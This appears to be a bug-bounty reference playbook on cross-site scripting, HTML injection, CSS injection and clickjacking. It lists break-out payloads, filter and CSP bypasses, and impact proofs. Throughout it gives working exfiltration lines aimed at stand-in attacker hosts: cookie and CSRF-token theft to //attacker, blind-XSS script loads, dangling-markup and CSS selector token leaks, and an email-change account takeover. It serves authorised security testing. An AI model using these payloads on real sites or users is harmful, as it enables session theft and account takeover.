# Moraa — XSS (context → execution → impact)

> HackTricks `xss-cross-site-scripting` + H1 patterns. Deep pack: `offensive-xss`. Cross-ref
> [[cors]] (XSS on a CORS-trusted origin = credential theft — our the vendor chain), [[js-analysis]]
> (find DOM sinks in bundles), [[bypass-4xx]]/[[framework-misconfig]] (CSP).
> This doc also owns the scriptless branches of the same decision (markup/CSS lands, `<script>`
> blocked): § HTML injection / dangling markup and § CSS injection at the bottom.

## Rule: a reflection is not XSS until it EXECUTES
Prove execution (alert / DOM change / collaborator hit), not just that input is echoed. Then write the
*impact* (cookie/token theft, ATO, admin-action), not "alert(1) popped".

## 1. Find the context (dictates the payload)
Inject a unique marker (`qzx123<>"'`) and see how it lands:
| Context | Break-out payload |
|---|---|
| Raw HTML body | `<img src=x onerror=alert(1)>` · `<svg onload=alert(1)>` |
| HTML attribute (quoted) | `" autofocus onfocus=alert(1) x="` (or close the tag: `"><svg onload=...>`) |
| Unquoted attribute | ` onmouseover=alert(1) ` |
| Inside `<script>` string | `';alert(1)//` · `</script><svg onload=alert(1)>` · template `${alert(1)}` |
| URL / href | `javascript:alert(1)` · `data:text/html,<script>alert(1)</script>` |
| Client-side template (Angular/Vue/Mavo) | `{{constructor.constructor('alert(1)')()}}` (CSTI) |
| Dynamically-generated `.js` file (server codegen, see 1b) | `";alert(1)//` — break the JS string literal in the generated source |

### 1b. Server-side JS code-generation injection via string concatenation (ysamm "capig-xss",
Jan 2026 — Facebook Conversions API Gateway) — stored XSS when the OUTPUT is a .js file, not HTML
Some endpoints don't render HTML at all — they dynamically GENERATE a JavaScript file (SDK loader,
config script) by literally `append()`-ing user-supplied JSON values into a JS STRING LITERAL inside
the generated code. No template engine, no escaping — just naive string concatenation building JS
source. A value containing `"` breaks out of the string-literal context → arbitrary executable JS
inside the generated file. And because that .js is STORED and served to every visitor who loads the
resource, a successful breakout is stored XSS affecting every future visitor, not just the requester.

**Hunt/test:** find any endpoint whose RESPONSE is a dynamically-generated `.js` file (not HTML) →
check whether it takes any parameter that ends up embedded in the generated code → test breaking out
of whatever context that parameter lands in (string literal via `"`/`'`, or out of a JSON-in-JS
blob) the same way you'd break out of an HTML-attribute/JS-string context for classic XSS. The
difference here: the OUTPUT is itself a .js file other pages `<script src>` load, so a successful
breakout is STORED and affects every future visitor of that resource, not just the requester.

## 2. Type
- **Reflected:** param echoed → malicious URL, no persistence.
- **Stored:** input saved & rendered to others → highest (fires for admins/other users). Prime spots: profile/display name, comments/posts, support-ticket bodies, filenames, error logs, webhook/notification content.
- **DOM:** JS pipes a source into a sink with no server reflection. **Sources:** `location`/`document.URL`/`referrer`/`name`/`postMessage`. **Sinks:** `innerHTML`,`outerHTML`,`document.write`,`eval`,`setTimeout`,`.src`,`.html()`, `dangerouslySetInnerHTML`, `v-html`. Grep the bundle for these ([[js-analysis]]).

## 3. Filter / WAF bypass (try in order)
- Case: `<ScRiPt>`, `<SvG oNlOaD=...>`
- No parens: `` onerror=alert`1` ``, `<svg onload=alert&lpar;1&rpar;>`, `.call`/`.apply`
- No spaces: `/**/`, `%09` (tab), `%0a`, `<svg/onload=...>`
- Encoding: HTML entities `&#x61;`, unicode `alert`, double-encode, `<scr<script>ipt>`
- Alt tags/events: `<iframe srcdoc="<script>...">`, `<input autofocus onfocus=...>`, `<details ontoggle=...>`, `<video><source onerror=...>`
- Mutation XSS (mXSS) via `innerHTML` re-parsing; `<noscript>`/`<template>` tricks.

## 4. CSP bypass (when a policy is present — check it first)
- `script-src` allows a CDN with a JSONP/known gadget (`cdnjs`, `googleapis`) → load a gadget.
- `base-uri` unset → `<base href=//attacker>` hijacks relative script loads.
- Missing/`unsafe-inline` → inline runs. Nonce reuse / predictable nonce.
- `strict-dynamic` + an injectable trusted script.
- Dangling-markup / CSS exfil when script is fully blocked (still leaks CSRF token / data) —
  full batteries: § HTML injection and § CSS injection below.
**Our lesson:** a strict CSP (`'self'` + pinned sha256, no `unsafe-inline`) genuinely blocks the
chain — pull the live CSP header before assuming an XSS is exploitable; it may be inert *and* it tells
you which hosts CAN chain (e.g. `account.acme.example` had `unsafe-inline` → chainable to the CORS creds bug).

## 5. Blind XSS (fire in someone else's browser)
Plant `"><script src=//COLLAB></script>` / `<img src=x onerror="import('//COLLAB/x.js')">` in fields an
admin/support agent will VIEW: support tickets, feedback, user-agent/referer logs, order notes,
account fields. Confirm via XSSHunter/interactsh. Our engagement's `account.acme.example` ticket-comment
renderer was the candidate here — but Zendesk HTML-escaped the body (verified), so it closed. **Always
read the value back to confirm it isn't escaped/sanitized before claiming stored XSS.**

## 6. Impact (write the "so what")
```js
// cookie/token exfil (only if not HttpOnly)
new Image().src='//attacker/?c='+encodeURIComponent(document.cookie)
// CSRF-token exfil → ATO (works even with HttpOnly cookies)
fetch('/account',{credentials:'include'}).then(r=>r.text()).then(h=>fetch('//attacker/?t='+h.match(/csrf.*?([a-f0-9]{16,})/i)[1]))
// full session-riding action: change email → password reset → ATO
fetch('/api/account',{method:'PUT',credentials:'include',headers:{'Content-Type':'application/json'},body:'{"email":"attacker@x"}'})
// XSS on a *.target.com origin that a sensitive API CORS-trusts → steal creds/data (see [[cors]])
```
Rank by: stored+admin-context > reflected-with-ATO-chain > reflected-self > DOM-needs-interaction.

## Impact gate — who else's browser fires it? (the self-XSS line)

- **Name the second identity.** Stored needs someone other than you to load it; reflected needs a
  delivery that puts YOUR link in THEIR browser. If firing the payload requires the victim to
  paste it into their own profile/console, that is self-XSS — on the always-rejected list alone.
- Self-XSS becomes a finding only as the [[validate]] chain row (self-XSS + login CSRF, or a
  postMessage/frame primitive) firing in ANOTHER user's session — prove the delivery primitive
  end-to-end, not both halves separately.
- Execution proof still applies: an escaped echo, or a payload the live CSP blocks, is a clean
  negative ([[controls-and-oracles]] — fire the control that must execute).

---

## HTML injection / dangling markup (raw HTML allowed, `<script>` blocked)

> Sourced from elementalsouls/Claude-BugHunter `hunt-html-injection`. The no-JS branch of the XSS
> decision tree above. Cross-ref [[csrf]] (dangling markup can leak the CSRF token to exfil).

### Prove it with a unique canary, not a generic tag
Inject `<b>CANARY_1234</b>` (or `"><b>CANARY_1234</b>` to break an attribute context) into
search/comment/profile/error fields. **Vulnerable** = response contains literal `<b>CANARY_1234</b>`.
**Secure** = HTML-encoded (`&lt;b&gt;...&lt;/b&gt;`). If `<b>` is filtered, try `<h1>`, `<em>`, `<i>`.

### Escalate toward execution
```
<img src=x onerror=CANARY_5678>          # if THIS fires, you have XSS, not just HTML injection — pivot to §1-§3 above
<svg onload=alert(CANARY_9012)>
<a href="https://attacker.com">LINK</a>  # phishing pivot even without JS
```

### When script is truly blocked — dangling markup (CSS/scriptless exfil)
```
<img src='//attacker.tld/log?html=
```
No closing quote/bracket. The browser treats **everything until the next literal `'`** — often the
rest of the page, including a CSRF token or other secret rendered later — as the URL's query string,
and fetches it to attacker infra. This works even under a CSP that blocks all script execution,
because it's just an `<img>` tag.

Other scriptless primitives:
```
<meta http-equiv="refresh" content="0;url=https://attacker.com">      # forced redirect, no JS
<form action="https://attacker.com/steal"><input name="creds"></form> # hijack a later form's submit target
```

### Check the email/notification context separately
Fields that are filtered on the web UI are frequently rendered **unfiltered in an email notification**
(subject line, comment-notification body). Trigger the notification, inspect the raw email source —
tag injection often succeeds there even when the web page blocks it.

### Proof standard
Vulnerable: literal unescaped tag in the response/email source. If you also get `<script>` or an event
handler to fire, that's XSS — use §1-§6 above for the full exploitation/impact writeup, don't stop at
"HTML injection" if execution is achievable.

**The canary rendering itself proves injection, not impact.**

#### Impact gate — injection is not impact
The falsifier: name what an
ATTACKER's markup steals or changes for a VICTIM — dangling-markup CSRF-token exfil, a form/redirect
hijack, phishing content rendered in a trusted context, injection surviving into a notification email
others receive. Markup only you can render, only in your own session, is self-XSS-adjacent hardening
advice — drop it or find the victim-side delivery.

### Priority surfaces
Search boxes, comments, profile fields, error messages, contact forms, admin/support-agent-viewed logs.

---

## CSS injection (scriptless exfil, survives strict CSP)

> Load when user CSS/style is accepted (themes, custom CSS, `style=` attribute, rich-text/markdown
> that allows `<style>`) or when `<script>` is blocked but stylesheet control isn't. CSP targets
> script execution, not stylesheet rules — CSS injection routinely survives a strict CSP. Cross-ref
> the § HTML injection section above (dangling-markup exfil, same scriptless-exfil family),
> [[clickjacking]].

### Where this appears
User-customizable themes (forum/CMS/SaaS "custom CSS" field), HTML-email rendering, rich-text/
markdown engines that pass through `<style>`/`style=`, HTML-to-PDF pipelines (headless Chrome
renders CSS server-side), SSTI output landing inside a `<style>` block.

### Attribute-selector token exfiltration (core attack — no JS, survives CSP)
Leak a CSRF token / API key / reset token one character per round via `background:url()` firing on
a matching attribute selector:
```css
input[name="csrf"][value^="a"] { background: url(//attacker.com/?c=a) }
input[name="csrf"][value^="b"] { background: url(//attacker.com/?c=b) }
/* ... 62 rules covering [a-zA-Z0-9] ... */
```
Mechanics: victim loads the page with `<input value="abc123...">`. Browser evaluates all 62 rules —
only one `value^="X"` prefix matches → fires `GET //attacker.com/?c=X` → that's character 1. Rewrite
with `value^="aX"`, `value^="bX"`... for character 2. Token of length N fully extracted in N rounds.
Variants: `[value^="X"]` prefix, `[value$="X"]` suffix (keystroke-log an `<input>`), `[value*="X"]`
substring (short alphabets).

### Opacity clickjacking — the working PoC `validate.md` requires
Our `validate.md` conditionally-valid table lists "clickjacking + sensitive action + working PoC" —
this is that PoC:
```html
<!-- Hosted on attacker.com -->
<button style="position:absolute;top:50px;left:50px;z-index:1;">Click to win iPhone!</button>
<iframe src="https://target.com/account/delete?confirm=1"
        style="position:absolute;top:50px;left:50px;width:200px;height:50px;
               opacity:0;z-index:9999;"></iframe>
```
Adjust `top/left/width/height` to overlay the exact sensitive control (transfer/delete/change-email
submit, OAuth consent "Approve"). Verify before reporting: `X-Frame-Options` absent/`ALLOWALL`, CSP
`frame-ancestors` absent/wildcard/attacker-listed, the action needs only one click (no second
confirm), cookies are `SameSite=None`/omitted so the iframe still carries the session.

### `@import` — full stylesheet takeover when `<script>` is filtered but CSS isn't
```css
@import url(https://attacker.com/evil.css);
```
Now the attacker controls ALL page styling — overlay a phishing login form, hide a warning banner,
reposition cancel/confirm buttons.

### Font-based character oracle (rare, for short rendered values — PINs/OTP digits)
```css
@font-face { font-family: x; src: url(//attacker.com/?d=5); unicode-range: U+0035; }
/* fires the font request ONLY if the character "5" is rendered anywhere on the page */
```

### Submittable vs N/A (`validate.md` gate)
| Finding | Verdict |
|---|---|
| Attribute selector exfils real token/password/SSN | High |
| `@import`/full stylesheet control + working phishing PoC | High |
| Opacity clickjacking + completes a sensitive action in the PoC | Medium/High |
| Only cosmetic CSS allowed (no `url()`/`@import`), no exfil path | N/A |
| `url()` blocked but positioning/transforms allowed | Info — clickjacking-chain only |
| Font side-channel leaking a short rendered value (PIN/OTP) | Low/Medium (chain) |
| CSS injection with no exfil AND no overlay path | N/A standalone |

### Method
Confirm CSS control (inject a canary rule, check it renders) → identify what's reachable
(`url()`/`@import` allowed? positioning allowed?) → pick the primitive: attribute-selector exfil if
a sensitive value is in the DOM, opacity overlay if there's a one-click sensitive action, `@import`
if full takeover is possible → prove it with a real Collaborator/`python3 -m http.server` hit, not a
theoretical rule set. → `validate.md` → `findings/`.
